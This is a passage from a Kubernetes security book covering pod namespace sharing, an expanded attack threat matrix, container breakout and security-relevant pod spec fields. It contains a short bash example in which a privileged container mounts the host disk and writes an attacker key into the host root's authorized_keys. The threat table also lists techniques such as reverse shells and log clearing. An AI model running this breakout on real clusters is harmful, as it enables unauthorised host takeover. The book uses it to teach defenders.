<p>A group of containers <a data-type="indexterm" data-primary="containers" data-secondary="namespaces" data-tertiary="sharing" id="cont_name_shar"/><a data-type="indexterm" data-primary="namespaces" data-secondary="sharing" id="namesp_shar"/><a data-type="indexterm" data-primary="security" data-secondary="namespaces, sharing" id="sec_namesp_shar"/>in a pod share a network namespace, so all your containers’ ports are available on the same
network adapter to every container in the pod. This gives an attacker in one container of the pod a chance to attack
private sockets available on any network interface, including the loopback adapter <code>127.0.0.1</code>.</p>
<div data-type="tip"><h6>Tip</h6>
<p>We examine these concepts in greater detail in Chapters <a data-type="xref" data-xrefstyle="select:labelnumber" href="ch05.xhtml#ch-networking">5</a> and <a data-type="xref" data-xrefstyle="select:labelnumber" href="ch06.xhtml#ch-storage">6</a>.</p>
</div>

<p class="pagebreak-before">Each container runs in a root filesystem from its container image that is not shared between containers. Volumes
must be mounted into each container in the pod 
<span class="keep-together">configuration,</span> but a pod’s volumes may be available to all containers if
configured that way, as you saw in <a data-type="xref" href="#pod-examples">Figure 2-4</a>.</p>

<p><a data-type="xref" href="#pod-namespace-nested">Figure 2-8</a>  shows some of the paths inside a container workload that an attacker may be
interested in (note the <code>user</code> and <code>time</code> namespaces are not currently in use).</p>

<figure><div id="pod-namespace-nested" class="figure">
<img src="Images/haku_0209.png" alt="Nested Pod Namespaces" width="1444" height="724"/>
<h6><span class="label">Figure 2-8. </span>Namespaces wrapping the containers in a pod (<a href="https://oreil.ly/nH9y8">inspired by Ian Lewis</a>)</h6>
</div></figure>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>User namespaces <a data-type="indexterm" data-primary="user namespaces" id="idm45302818942048"/>are the ultimate kernel security frontier, and are generally not enabled due to historically being
likely entry points for kernel attacks: everything in Linux is a file, and user namespace implementation cuts across
the whole kernel, making it more difficult to secure than other namespaces.</p>
</div>

<p>The special virtual filesystems listed here are all possible paths of breakout if misconfigured and accessible inside the container: <em>/dev</em> may give access to the host’s devices, <em>/proc</em> can leak process information, or <em>/sys</em> supports functionality like launching new <a data-type="indexterm" data-primary="containers" data-secondary="namespaces" data-tertiary="sharing" data-startref="cont_name_shar" id="idm45302818921392"/><a data-type="indexterm" data-primary="namespaces" data-secondary="sharing" data-startref="namesp_shar" id="idm45302818920064"/><a data-type="indexterm" data-primary="security" data-secondary="namespaces, sharing" data-startref="sec_namesp_shar" id="idm45302818918976"/>containers.</p>
</div></section>













<section data-type="sect2" class="less_space pagebreak-before" data-pdf-bookmark="What’s the Worst That Could Happen?"><div class="sect2" id="idm45302818917760">
<h2>What’s the Worst That Could Happen?</h2>

<p>A CISO is responsible<a data-type="indexterm" data-primary="threat matrices" id="thrt_matrices"/><a data-type="indexterm" data-primary="security" data-secondary="threat matricies" id="sec_thrtmatrix"/><a data-type="indexterm" data-primary="threats" data-secondary="types" id="thrt_typ"/> for the organization’s security.
Your role as a CISO means you should consider worst-case scenarios, to ensure that you have
appropriate defenses and mitigations in place. Attack
trees help to model these negative outcomes, and one of the data sources you can use is the
<a href="https://oreil.ly/LyjsO">threat matrix</a> as shown in <a data-type="xref" href="#pod-threat-matrix">Figure 2-9</a>.</p>

<figure><div id="pod-threat-matrix" class="figure">
<img src="Images/haku_0210.png" alt="Microsoft Kubernetes Threat Matrix" width="1601" height="961"/>
<h6><span class="label">Figure 2-9. </span>Microsoft Kubernetes threat matrix; source: <a href="https://oreil.ly/JzdmV">“Secure Containerized Environments with Updated Threat Matrix for Kubernetes”</a></h6>
</div></figure>

<p>But there are some threats missing, and the community has added some (thanks to Alcide, and <a href="https://oreil.ly/Ll2de">Brad Geesaman</a> and <a href="https://oreil.ly/NmidV">Ian Coldwater</a> again), as shown in <a data-type="xref" href="#table0201">Table 2-1</a>.</p>
<div class="landscape">
<table id="table0201">
<caption><span class="label">Table 2-1. </span>Our enhanced Microsoft Kubernetes threat matrix</caption>
<thead>
<tr>
<th>Initial access (popping a shell pt 1 - prep)</th>
<th>Execution (popping a shell pt 2 - exec)</th>
<th>Persistence (keeping the shell)</th>
<th>Privilege escalation (container breakout)</th>
<th>Defense evasion (assuming no IDS)</th>
<th>Credential access (juicy creds)</th>
<th>Discovery (enumerate possible pivots)</th>
<th>Lateral movement (pivot)</th>
<th>Command &amp; control (C2 methods)</th>
<th>Impact (dangers)</th>
</tr>
</thead>
<tbody>
<tr>
<td><p>Using cloud credentials: service account keys, impersonation</p></td>
<td><p>Exec into container (bypass admission control policy)</p></td>
<td><p>Backdoor container (add a reverse shell to local or container registry image)</p></td>
<td><p>Privileged container (legitimate escalation to host)</p></td>
<td><p>Clear container logs (covering tracks after host breakout)</p></td>
<td><p>List K8s Secrets</p></td>
<td><p>List K8s API server (nmap, curl)</p></td>
<td><p>Access cloud resources (workload identity and cloud integrations)</p></td>
<td><p>Dynamic resolution (DNS tunneling)</p></td>
<td><p>Data destruction (datastores, files, NAS, ransomware…)</p></td>
</tr>
<tr>
<td><p>Compromised images in registry (supply chain unpatched or malicious)</p></td>
<td><p>BASH/CMD inside container (implant or trojan, RCE/reverse shell, malware, C2, DNS tunneling)</p></td>
<td><p>Writable host path mount (host mount breakout)</p></td>
<td><p>Cluster admin role binding (untested RBAC)</p></td>
<td><p>Delete K8s events (covering tracks after host breakout)</p></td>
<td><p>Mount service principal (Azure specific)</p></td>
<td><p>Access <code>kubelet</code> API</p></td>
<td><p>Container service account (API server)</p></td>
<td><p>App protocols (L7 protocols, TLS, …)</p></td>
<td><p>Resource hijacking (cryptojacking, malware C2/distribution, open relays, botnet membership)</p></td>
</tr>
<tr>
<td><p>Application vulnerability (supply chain unpatched or malicious)</p></td>
<td><p>Start new container (with malicious payload: persistence, enumeration, observation, escalation)</p></td>
<td><p>K8s CronJob (reverse shell on a timer)</p></td>
<td><p>Access cloud resources (metadata attack via workload identity)</p></td>
<td><p>Connect from proxy server (to cover source IP, external to cluster)</p></td>
<td><p>Applications credentials in config files (key material)</p></td>
<td><p>Access K8s dashboard (UI requires service account credentials)</p></td>
<td><p>Cluster internal networking (attack neighboring pods or systems)</p></td>
<td><p>Botnet (k3d, or traditional)</p></td>
<td><p>Application DoS</p></td>
</tr>
<tr>
<td><p>kubeconfig file (exfiltrated, or uploaded to the wrong place)</p></td>
<td><p>Application exploit (RCE)</p></td>
<td><p>Static pods (reverse shell, shadow API server to read audit-log-only headers)</p></td>
<td><p>Pod <code>hostPath</code> mount (logs to container breakout)</p></td>
<td><p>Pod/container name similarity (visual evasion, CronJob attack)</p></td>
<td><p>Access container service account (RBAC lateral jumps)</p></td>
<td><p>Network mapping (nmap, curl)</p></td>
<td><p>Access container service account (RBAC lateral jumps)</p></td>
<td/>
<td><p>Node scheduling DoS</p></td>
</tr>
<tr>
<td><p>Compromise user endpoint (2FA and federating auth mitigate)</p></td>
<td><p>SSH server inside container (bad practice)</p></td>
<td><p>Injected sidecar containers (malicious mutating webhook)</p></td>
<td><p>Node to cluster escalation (stolen credentials, node label rebinding attack)</p></td>
<td><p>Dynamic resolution (DNS) (DNS tunneling/exfiltration)</p></td>
<td><p>Compromise admission controllers</p></td>
<td><p>Instance metadata API (workload identity)</p></td>
<td><p>Host writable volume mounts</p></td>
<td/>
<td><p>Service discovery DoS</p></td>
</tr>
<tr>
<td><p>K8s API server vulnerability (needs CVE and unpatched API server)</p></td>
<td><p>Container lifecycle hooks (<code>postStart</code> and <code>preStop</code> events in pod YAML)</p></td>
<td><p>Rewrite container lifecycle hooks (<code>postStart</code> and <code>preStop</code> events in pod YAML)</p></td>
<td><p>Control plane to cloud escalation (keys in Secrets, cloud or control plane credentials)</p></td>
<td><p>Shadow admission control or API server</p></td>
<td/>
<td><p>Compromise K8s Operator (sensitive RBAC)</p></td>
<td><p>Access K8s dashboard</p></td>
<td/>
<td><p>PII or IP exfiltration (cluster or cloud datastores, local accounts)</p></td>
</tr>
<tr>
<td><p>Compromised host (credentials leak/stuffing, unpatched services, supply chain compromise)</p></td>
<td/>
<td><p>Rewrite liveness probes (exec into and reverse shell in container)</p></td>
<td><p>Compromise admission controller (reconfigure and bypass to allow blocked image with flag)</p></td>
<td/>
<td/>
<td><p>Access host filesystem (host mounts)</p></td>
<td><p>Access tiller endpoint (Helm v3 negates this)</p></td>
<td/>
<td><p>Container pull rate limit DoS (container registry)</p></td>
</tr>
<tr>
<td><p>Compromised <code>etcd</code> (missing auth)</p></td>
<td/>
<td><p>Shadow admission control or API server (privileged RBAC, reverse shell)</p></td>
<td><p>Compromise K8s Operator (compromise flux and read any Secrets)</p></td>
<td/>
<td/>
<td/>
<td><p>Access K8s Operator</p></td>
<td/>
<td><p>SOC/SIEM DoS (event/audit/log rate limit)</p></td>
</tr>
<tr>
<td/>
<td/>
<td><p>K3d botnet (secondary cluster running on compromised nodes)</p></td>
<td><p>Container breakout (kernel or runtime vulnerability e.g., DirtyCOW, `/proc/self/exe`, eBPF verifier bugs, Netfilter)</p></td>
<td/>
<td/>
<td/>
<td/>
<td/>
<td/>
</tr>
</tbody>
</table>
</div>

<p>We’ll explore these threats in detail as we progress through the book. But the first threat, and the greatest risk
to the isolation model of our systems, is an attacker breaking out of the container <a data-type="indexterm" data-primary="threat matrices" data-startref="thrt_matrices" id="idm45302818846144"/><a data-type="indexterm" data-primary="security" data-secondary="threat matricies" data-startref="sec_thrtmatrix" id="idm45302818845168"/><a data-type="indexterm" data-primary="threats" data-secondary="types" data-startref="thrt_typ" id="idm45302818843952"/>itself.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Container Breakout"><div class="sect2" id="idm45302818842480">
<h2>Container Breakout</h2>

<p>A cluster admin’s worst fear is a container breakout; that is, a user or process
inside a container <a data-type="indexterm" data-primary="container breakouts" data-secondary="overview" id="idm45302818840384"/><a data-type="indexterm" data-primary="attacks" data-secondary="container breakouts" id="attck_contbrkout"/>that can run code outside of the container’s execution environment.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>Speaking strictly, a container breakout should exploit the kernel, attacking the code a container is supposed to be
constrained by. In the authors’ opinion, any avoidance of isolation mechanisms breaks the contract the container’s
maintainer or operator thought they had with the process(es) inside. This means it should be
considered equally threatening to the security of the host system and its data, so we define container breakout to
include any evasion of isolation.</p>
</div>

<p>Container breakouts may occur in various ways:</p>

<ul>
<li>
<p>An <em>exploit</em> including against <a data-type="indexterm" data-primary="exploits" data-secondary="container breakouts" id="idm45302818834400"/>the kernel, network or storage stack, or container runtime</p>
</li>
<li>
<p>A <em>pivot</em> such as <a data-type="indexterm" data-primary="pivots, container breakouts" id="idm45302818831904"/>attacking exposed local, cloud, or network services, or escalating privilege and abusing discovered
or inherited credentials</p>
</li>
<li>
<p>A <em>misconfiguration</em> that <a data-type="indexterm" data-primary="configuration" data-secondary="container breakouts" id="idm45302818829648"/>allows an attacker an easier or legitimate path to exploit or pivot (this is the most likely way)</p>
</li>
</ul>

<p>If the running process is owned by an unprivileged user (that is, one with no root capabilities), many breakouts are not
possible. In that case the process or user must gain capabilities with a local privilege escalation<a data-type="indexterm" data-primary="privilege escalation" data-secondary="container breakouts" id="idm45302818827520"/> inside the
container before attempting to break out.</p>

<p>Once this is achieved, a breakout may start with a hostile root-owned process running in a poorly configured container.
Access to the root user’s capabilities within a container is the precursor to most escapes: without root (and sometimes
<code>CAP_SYS_ADMIN</code>), many breakouts are nullified.</p>
<div data-type="tip"><h6>Tip</h6>
<p>The <code>securityContext</code> and LSM configurations <a data-type="indexterm" data-primary="securityContext" id="idm45302818823840"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" id="idm45302818823136"/><a data-type="indexterm" data-primary="LSMs (Linux Security Modules)" data-secondary="configuration" id="idm45302818822192"/>are vital to constrain unexpected activity from <a data-type="indexterm" data-primary="zero-day vulnerabilities" data-secondary="container breakouts" id="idm45302818821088"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="zero-day" id="idm45302818820176"/>zero-day vulnerabilities,
or supply chain attacks (library code loaded into the container and exploited automatically at runtime).</p>

<p>You can
define the active user, group, and filesystem group (set on mounted volumes for readability, gated by
<code>fsGroupChangePolicy</code>) in your workloads’ security contexts, and enforce it with admission control (see
<a data-type="xref" href="ch08.xhtml#ch-policy">Chapter 8</a>), as this
<a href="https://oreil.ly/YJNS6">example from the docs</a> shows:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">apiVersion</code><code class="p">:</code> <code class="l-Scalar-Plain">v1</code>
<code class="nt">kind</code><code class="p">:</code> <code class="l-Scalar-Plain">Pod</code>
<code class="nt">metadata</code><code class="p">:</code>
  <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">security-context-demo</code>
<code class="nt">spec</code><code class="p">:</code>
  <code class="nt">securityContext</code><code class="p">:</code>
    <code class="nt">runAsUser</code><code class="p">:</code> <code class="l-Scalar-Plain">1000</code>
    <code class="nt">runAsGroup</code><code class="p">:</code> <code class="l-Scalar-Plain">3000</code>
    <code class="nt">fsGroup</code><code class="p">:</code> <code class="l-Scalar-Plain">2000</code>
  <code class="nt">containers</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">sec-ctx-demo</code>
<code class="c1"># ...</code>
    <code class="nt">securityContext</code><code class="p">:</code>
      <code class="nt">allowPrivilegeEscalation</code><code class="p">:</code> <code class="l-Scalar-Plain">false</code>
<code class="c1"># ...</code></pre>
</div>

<p>In a container breakout scenario, if the user is root inside the container or has mount capabilities
(granted by default under <code>CAP_SYS_ADMIN</code>, which root is granted unless dropped), they can interact with virtual and physical
disks mounted into the container. If the container is privileged (which among other things disables masking of kernel paths in <em>/dev</em>),
it can see and mount the host filesystem:</p>

<pre data-type="programlisting" data-code-language="bash"><code class="c"># inside a privileged container</code>
root@hack:~ <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>ls -lasp /dev/
root@hack:~ <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>mount /dev/xvda1 /mnt/

<code class="c"># write into host filesystem's /root/.ssh/ folder</code>
root@hack:~ <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>cat MY_PUB_KEY &gt;&gt; /mnt/root/.ssh/authorized_keys</pre>

<p>We look at <code>nsenter</code> privileged container breakouts, which escape more elegantly
by entering the host’s namespaces, in <a data-type="xref" href="ch06.xhtml#ch-storage">Chapter 6</a>.</p>

<p>While you should <a data-type="indexterm" data-primary="container breakouts" data-secondary="preventing" id="contbrkout_prevent"/>prevent this attack easily by avoiding the root user and privilege mode, and enforcing that with
admission control, it’s an indication of just how slim the container security boundary can be if misconfigured.</p>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p>An attacker controlling a containerized process may have control of the networking, some or all of the storage, and
potentially other containers in the pod. Containers generally assume other containers in the pod are friendly as
they share resources, and we can consider the pod as a trust boundary for the processes inside. Init containers are
an exception: they complete and shut down before the main containers in the pod start, and as they operate in isolation
may have more security sensitivity.</p>
</div>

<p>The container<a data-type="indexterm" data-primary="containers" data-secondary="isolation" id="idm45302818718640"/><a data-type="indexterm" data-primary="pods" data-secondary="isolation" id="idm45302818717632"/> and pod isolation model relies on the Linux kernel and container runtime, both of which are generally
robust when not misconfigured. Container breakout occurs more often through insecure configuration than kernel
exploit, although zero-day kernel vulnerabilities are inevitably devastating to Linux systems without correctly
configured LSMs (such as SELinux and AppArmor).</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>In <a data-type="xref" href="ch04.xhtml#architecting-apps-resilience">“Architecting Containerized Apps for Resilience”</a> we explore how the Linux DirtyCOW vulnerability could be used to
break out of insecurely configured containers.</p>
</div>

<p>Container escape is rarely plain sailing, and any fresh vulnerabilities are often patched shortly after disclosure.
Only occasionally does a kernel vulnerability result in an exploitable container breakout, and the opportunity to
harden individually containerized processes with LSMs enables defenders to tightly constrain high-risk network-facing
processes; it may entail one or more of:</p>

<ul>
<li>
<p>Finding a zero-day in the runtime or kernel</p>
</li>
<li>
<p>Exploiting excess privilege and escaping using legitimate commands</p>
</li>
<li>
<p>Evading misconfigured kernel security mechanisms</p>
</li>
<li>
<p>Introspection of other processes or filesystems for alternate escape routes</p>
</li>
<li>
<p>Sniffing network traffic for credentials</p>
</li>
<li>
<p>Attacking the underlying orchestrator or cloud <a data-type="indexterm" data-primary="container breakouts" data-secondary="preventing" data-startref="contbrkout_prevent" id="idm45302818682000"/>environment</p>
</li>
</ul>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p>Vulnerabilities in the<a data-type="indexterm" data-primary="hardware, vulnerabilities" id="idm45302818679264"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="hardware" id="idm45302818679008"/><a data-type="indexterm" data-primary="container breakouts" data-secondary="hardware vulnerabilities" id="idm45302818678160"/> underlying physical hardware often can’t be defended against in a container.
For example, <code>Spectre</code> and 
<span class="keep-together"><code>Meltdown</code></span> (CPU speculative execution attacks), and <code>rowhammer</code>, 
<span class="keep-together"><code>TRRespass</code></span>,
and <code>SPOILER</code> (DRAM memory attacks) bypass container isolation mechanisms as they cannot intercept
the entire instruction stream that a CPU processes. Hypervisors suffer the same lack of possible protection.</p>
</div>

<p>Finding new kernel attacks is hard. Misconfigured security settings, exploiting published CVEs, and social engineering
attacks are easier. But it’s important to understand the range of potential threats in order to decide your own risk
tolerance.</p>

<p>We’ll go through a step-by-step security feature exploration to see a range of ways in which your systems
may be attacked in <a data-type="xref" href="app01.xhtml#appendix-pod-attack">Appendix A</a>.</p>

<p>For more information <a data-type="indexterm" data-primary="attacks" data-secondary="container breakouts" data-startref="attck_contbrkout" id="idm45302818671168"/>on how the Kubernetes project manages CVEs, see Anne Bertucio and CJ Cullen’s blog post,
<a href="https://oreil.ly/wYvv6">“Exploring Container Security: Vulnerability Management in Open-Source Kubernetes”</a>.</p>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="Pod Configuration and Threats"><div class="sect1" id="idm45302818986448">
<h1>Pod Configuration and Threats</h1>

<p>We’ve spoken <a data-type="indexterm" data-primary="pods" data-secondary="configuration" data-tertiary="overview" id="idm45302818667424"/><a data-type="indexterm" data-primary="threats" data-secondary="pod configuration" data-tertiary="overview" id="idm45302818666272"/><a data-type="indexterm" data-primary="configuration" data-secondary="pods" data-tertiary="overview" id="idm45302818665024"/>generally about various parts of a pod, so let’s finish off by going into depth on a pod spec to call out
any gotchas or potential footguns.</p>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p>In order to secure a pod or container, the container runtime should be minimally viably secure; that is, not hosting
sockets to unauthenticated connections (e.g., Docker’s <em>/var/run/docker.sock</em> and <code>tcp://127.0.0.1:2375</code>) as it <a href="https://oreil.ly/jy8Ol">leads to host takeover</a>.</p>
</div>

<p>For the purpose of this example, we are using a <code>frontend</code> pod from the
<a href="https://oreil.ly/6WVwV"><code>GoogleCloudPlatform/microservices-demo</code> application</a>, and it
was deployed with the following command:</p>

<pre data-type="programlisting" data-code-language="bash">kubectl create -f <code class="se">\</code>
<code class="s2">"https://raw.githubusercontent.com/GoogleCloudPlatform/\</code>
<code class="s2">microservices-demo/master/release/kubernetes-manifests.yaml"</code></pre>

<p>We have updated and added some extra configuration where relevant for demonstration
purposes and will progress through these in the following sections.</p>








<section data-type="sect2" data-pdf-bookmark="Pod Header"><div class="sect2" id="idm45302818657424">
<h2>Pod Header</h2>

<p>The pod<a data-type="indexterm" data-primary="pods" data-secondary="configuration" data-tertiary="header" id="pods_config_head"/><a data-type="indexterm" data-primary="threats" data-secondary="pod configuration" data-tertiary="header" id="thrt_podconfig_head"/><a data-type="indexterm" data-primary="configuration" data-secondary="pods" data-tertiary="header" id="config_pods_head"/><a data-type="indexterm" data-primary="headers" data-secondary="pod configuration" id="head_podconfig"/> header is the standard header of all Kubernetes resources we know and love, defining the type of entity this YAML defines, and its version:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">apiVersion</code><code class="p">:</code> <code class="l-Scalar-Plain">v1</code>
<code class="nt">kind</code><code class="p">:</code> <code class="l-Scalar-Plain">Pod</code></pre>

<p>Metadata <a data-type="indexterm" data-primary="metadata" id="idm45302818603744"/><a data-type="indexterm" data-primary="annotations" id="idm45302818603248"/>and annotations may contain sensitive information like IP addresses or security hints
(in this case, for Istio), although this is only useful if the attacker has read-only access:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">metadata</code><code class="p">:</code>
  <code class="nt">annotations</code><code class="p">:</code>
    <code class="nt">seccomp.security.alpha.kubernetes.io/pod</code><code class="p">:</code> <code class="l-Scalar-Plain">runtime/default</code>
    <code class="nt">cni.projectcalico.org/podIP</code><code class="p">:</code> <code class="l-Scalar-Plain">192.168.155.130/32</code>
    <code class="nt">cni.projectcalico.org/podIPs</code><code class="p">:</code> <code class="l-Scalar-Plain">192.168.155.130/32</code>
    <code class="nt">sidecar.istio.io/rewriteAppHTTPProbers</code><code class="p">:</code> <code class="s">"true"</code></pre>

<p>It also historically holds the <code>seccomp</code>, <code>AppArmor</code>, and <code>SELinux</code> policies:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">metadata</code><code class="p">:</code>
  <code class="nt">annotations</code><code class="p">:</code>
    <code class="nt">container.apparmor.security.beta.kubernetes.io/hello</code><code class="p">:</code> <code class="s">"localhost/\</code>
      <code class="s">k8s-apparmor-example-deny-write"</code></pre>

<p>We look at how to use these annotations in <a data-type="xref" href="ch08.xhtml#policy-runtime-policies">“Runtime Policies”</a>.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>After many years in<a data-type="indexterm" data-primary="seccomp" data-secondary="annotations and" id="idm45302818575664"/><a data-type="indexterm" data-primary="securityContext" data-secondary="annotations and" id="idm45302818546384"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary="annotations and" id="idm45302818545440"/> limbo, <code>seccomp</code> in Kubernetes <a href="https://oreil.ly/F7zOs">progressed to General Availability in v1.19</a>.</p>

<p>This <a href="https://oreil.ly/raOrF">changes the syntax</a> from an annotation to a <code>securityContext</code> entry:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">securityContext</code><code class="p">:</code>
  <code class="nt">seccompProfile</code><code class="p">:</code>
    <code class="nt">type</code><code class="p">:</code> <code class="l-Scalar-Plain">Localhost</code>
    <code class="nt">localhostProfile</code><code class="p">:</code> <code class="l-Scalar-Plain">my-seccomp-profile.json</code></pre>

<p>The <a href="https://oreil.ly/Lrw5d">Kubernetes Security Profiles Operator</a> (SPO) <a data-type="indexterm" data-primary="Security Profiles Operator (SPO)" id="idm45302818536096"/><a data-type="indexterm" data-primary="SPO (Security Profiles Operator)" id="idm45302818511728"/>can install <code>seccomp</code> profiles on your nodes (a prerequisite to their use by the container runtime), and record new profiles from workloads in the cluster with <a href="https://oreil.ly/A3Ub4">oci-seccomp-bpf-hook</a>.</p>

<p>The SPO also supports <a data-type="indexterm" data-primary="selinuxd" id="idm45302818509200"/>SELinux via <a href="https://oreil.ly/nYQOU">selinuxd</a>, with plenty of details <a href="https://oreil.ly/3ZFui">in this blog post</a>.</p>

<p>AppArmor <a data-type="indexterm" data-primary="AppArmor" id="idm45302818506512"/>is still in beta but annotations will be replaced with first-class fields like <code>seccomp</code> once it graduates to GA.</p>
</div>

<p>Let’s move on to a part of the pod spec that is not writable by the client
but contains some important<a data-type="indexterm" data-primary="pods" data-secondary="configuration" data-tertiary="header" data-startref="pods_config_head" id="idm45302818504672"/><a data-type="indexterm" data-primary="threats" data-secondary="pod configuration" data-tertiary="header" data-startref="thrt_podconfig_head" id="idm45302818503152"/><a data-type="indexterm" data-primary="configuration" data-secondary="pods" data-tertiary="header" data-startref="config_pods_head" id="idm45302818501664"/><a data-type="indexterm" data-primary="headers" data-secondary="pod configuration" data-startref="head_podconfig" id="idm45302818500176"/> hints.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Reverse Uptime"><div class="sect2" id="idm45302818656832">
<h2>Reverse Uptime</h2>

<p>When you dump <a data-type="indexterm" data-primary="pods" data-secondary="vulnerabilbites, uptime" id="pods_vuln_uptme"/><a data-type="indexterm" data-primary="threats" data-secondary="pod uptime" id="thrt_poduptime"/><a data-type="indexterm" data-primary="configuration" data-secondary="pods" data-tertiary="uptime" id="config_pods_uptime"/><a data-type="indexterm" data-primary="uptime, security considerations" id="up_head_podconfig"/>a pod spec from the API server (using, for example, <code>kubectl get</code> 
<span class="keep-together"><code>-o
yaml</code>)</span> it includes the pod’s start time:</p>

<pre data-type="programlisting" data-code-language="yaml">  <code class="nt">creationTimestamp</code><code class="p">:</code> <code class="s">"2021-05-29T11:20:53Z"</code></pre>

<p>Pods running for longer than a week or two are likely to be at higher risk of unpatched
bugs. Sensitive workloads running for more than 30 days will be safer if they’re rebuilt in CI/CD to account for library or
operating system patches.</p>

<p class="pagebreak-before">Pipeline scanning <a data-type="indexterm" data-primary="pipelines" data-seealso="supply chains" id="idm45302818463600"/><a data-type="indexterm" data-primary="pipelines" data-secondary="scanning" id="idm45302818461488"/><a data-type="indexterm" data-primary="security" data-secondary="pipelines" data-tertiary="scanning" id="idm45302818460544"/><a data-type="indexterm" data-primary="containers" data-secondary="pipeline scanning" id="idm45302818459328"/>the existing container image offline for CVEs can be used to inform rebuilds.
The safest approach is to combine both: “repave” (that is, rebuild and redeploy containers) regularly, and rebuild
through the CI/CD pipelines whenever a <a data-type="indexterm" data-primary="pods" data-secondary="vulnerabilbites, uptime" data-startref="pods_vuln_uptme" id="idm45302818458000"/><a data-type="indexterm" data-primary="threats" data-secondary="pod uptime" data-startref="thrt_poduptime" id="idm45302818456784"/><a data-type="indexterm" data-primary="configuration" data-secondary="pods" data-tertiary="uptime" data-startref="config_pods_uptime" id="idm45302818455568"/><a data-type="indexterm" data-primary="uptime, security considerations" data-startref="up_head_podconfig" id="idm45302818454080"/>CVE is detected.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Labels"><div class="sect2" id="idm45302818452944">
<h2>Labels</h2>

<p>Labels in<a data-type="indexterm" data-primary="pods" data-secondary="labels" id="idm45302818451536"/><a data-type="indexterm" data-primary="labels" data-secondary="security considerations" id="idm45302818450528"/><a data-type="indexterm" data-primary="security" data-secondary="labels" id="idm45302818449584"/> Kubernetes are not validated or strongly typed; they are metadata. But labels are targeted by things like services
and controllers using selectors for referencing, and are also used for security features such as network policy. This makes them security-sensitive and easily susceptible to misconfiguration:</p>

<pre data-type="programlisting" data-code-language="yaml">  <code class="nt">labels</code><code class="p">:</code>
    <code class="nt">app</code><code class="p">:</code> <code class="l-Scalar-Plain">frontend</code>
    <code class="nt">type</code><code class="p">:</code> <code class="l-Scalar-Plain">redis</code></pre>

<p>Typos in labels mean they do not match the intended selectors, and so can inadvertently introduce
security issues such as:</p>

<ul>
<li>
<p>Exclusions from expected network policy or admission control policy</p>
</li>
<li>
<p>Unexpected routing from service target selectors</p>
</li>
<li>
<p>Rogue pods that are not accurately targeted by operators or observability tooling</p>
</li>
</ul>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Managed Fields"><div class="sect2" id="idm45302818415648">
<h2>Managed Fields</h2>

<p>Managed <a data-type="indexterm" data-primary="pods" data-secondary="managed fields" id="idm45302818414432"/><a data-type="indexterm" data-primary="managed fields, security considerations" id="idm45302818413424"/><a data-type="indexterm" data-primary="security" data-secondary="managed fields" id="idm45302818412784"/>fields were introduced in v1.18 and support <a href="https://oreil.ly/UjXPY">server-side apply</a>. They <a data-type="indexterm" data-primary="server-side apply" id="idm45302818411056"/>duplicate information from elsewhere in the pod spec but are of
limited interest to us as we can read the entire spec from the API server. They look like this:</p>

<pre data-type="programlisting" data-code-language="yaml">  <code class="nt">managedFields</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">apiVersion</code><code class="p">:</code> <code class="l-Scalar-Plain">v1</code>
    <code class="nt">fieldsType</code><code class="p">:</code> <code class="l-Scalar-Plain">FieldsV1</code>
    <code class="nt">fieldsV1</code><code class="p">:</code>
      <code class="l-Scalar-Plain">f:metadata</code><code class="p-Indicator">:</code>
        <code class="l-Scalar-Plain">f:annotations</code><code class="p-Indicator">:</code>
          <code class="nt">.</code><code class="p">:</code> <code class="p-Indicator">{}</code>
          <code class="l-Scalar-Plain">f:sidecar.istio.io/rewriteAppHTTPProbers</code><code class="p-Indicator">:</code> <code class="p-Indicator">{}</code>
<code class="c1"># ...</code>
      <code class="l-Scalar-Plain">f:spec</code><code class="p-Indicator">:</code>
        <code class="l-Scalar-Plain">f:containers</code><code class="p-Indicator">:</code>
          <code class="l-Scalar-Plain">k:{"name":"server"}</code><code class="p-Indicator">:</code>
<code class="c1"># ...</code>
            <code class="l-Scalar-Plain">f:image</code><code class="p-Indicator">:</code> <code class="p-Indicator">{}</code>
            <code class="l-Scalar-Plain">f:imagePullPolicy</code><code class="p-Indicator">:</code> <code class="p-Indicator">{}</code>
            <code class="l-Scalar-Plain">f:livenessProbe</code><code class="p-Indicator">:</code>
<code class="c1"># ...</code></pre>
</div></section>













<section data-type="sect2" class="less_space pagebreak-before" data-pdf-bookmark="Pod Namespace and Owner"><div class="sect2" id="idm45302818408368">
<h2>Pod Namespace and Owner</h2>

<p>We know the pod’s name and namespace <a data-type="indexterm" data-primary="pods" data-secondary="namespaces" data-tertiary="all-namespaces" id="idm45302818316640"/><a data-type="indexterm" data-primary="namespaces" data-secondary="pods, all-namespaces" id="idm45302818315456"/><a data-type="indexterm" data-primary="all-namespaces" id="idm45302818314512"/>from the API request we made to retrieve it.</p>

<p>If we used <code>--all-namespaces</code> to return all pod configurations, this shows us the namespace:</p>

<pre data-type="programlisting" data-code-language="yaml">  <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">frontend-6b887d8db5-xhkmw</code>
